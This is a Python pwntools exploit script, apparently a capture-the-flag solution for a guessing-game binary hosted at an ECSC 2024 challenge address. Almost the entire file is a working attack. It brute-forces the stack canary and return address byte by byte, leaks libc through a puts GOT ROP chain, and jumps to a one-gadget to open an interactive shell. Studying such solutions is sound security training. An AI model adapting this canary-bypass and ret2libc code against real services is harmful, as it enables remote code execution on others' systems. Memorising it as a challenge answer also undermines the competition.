#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 'yetanotherguessinggame.challs.open.ecsc2024.it ' --port 38010 ./build/yet_another_guessing_game
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './build/yet_another_guessing_game')
libc = context.binary = ELF('./libs/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'yetanotherguessinggame.challs.open.ecsc2024.it'
port = int(args.PORT or 38010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

stack = []

for i in range(23):
    if (i == 14 or i == 15):
        stack.append(66)
        continue
    for j in range(1, 256):
        payload = b"A" * 17
        payload += bytes(stack)
        payload += j.to_bytes(1, "little")
        payload = payload.ljust(40, b"\x00")
        payload += b"A" * 17
        payload += bytes(stack)

        io.sendafter(b"Guess the secret!", payload)

        io.recvline()
        result = io.recvline()
        if b"win" in result:
            # print(f"appending {66 if j == 1 else j}")
            stack.append(j)
            io.sendafter(b"(y/n)", b"y")
            break
        
        io.sendafter(b"(y/n)", b"y")
        
stack = [0 if x == 66 else x for x in stack]
# print(stack)
canary = u64(b"\x00" + b"".join([x.to_bytes(1, "little") for x in stack[:7]]))
# print(b"".join([x.to_bytes(1, "little") for x in stack[7:15]]))
base_pointer = u64(b"".join([x.to_bytes(1, "little") for x in stack[7:15]]))
ret_addr = u64(b"".join([x.to_bytes(1, "little") for x in stack[15:21]]) + b"\x00\x00")
print(hex(ret_addr))
            
exe.addr = ret_addr - 0x1483
print(hex(exe.addr))

rop = ROP(exe)
payload = b"A" * 56
payload += p64(canary)
payload += p64(base_pointer)
payload += p64(exe.addr + rop.find_gadget(["pop rdi"])[0])
payload += p64(exe.addr + exe.got["puts"])
payload += p64(exe.addr + exe.symbols["puts"])
payload += p64(exe.addr + exe.symbols["game"])

io.sendafter(b"Guess the secret!", payload)
io.sendafter(b"(y/n)", b"n")
io.recvline()
io.recvline()
# print(io.recvline())
# print(libc.symbols["puts"])
libc.addr = u64(io.recv(6) + b"\x00\x00") - libc.symbols["puts"]
print(hex(libc.addr))

payload = b"A" * 56
payload += p64(canary)
payload += p64(base_pointer)
payload += p64(libc.addr + 0xe3b01)
io.sendafter(b"Guess the secret!", payload)
io.sendafter(b"(y/n)", b"n")


io.interactive()

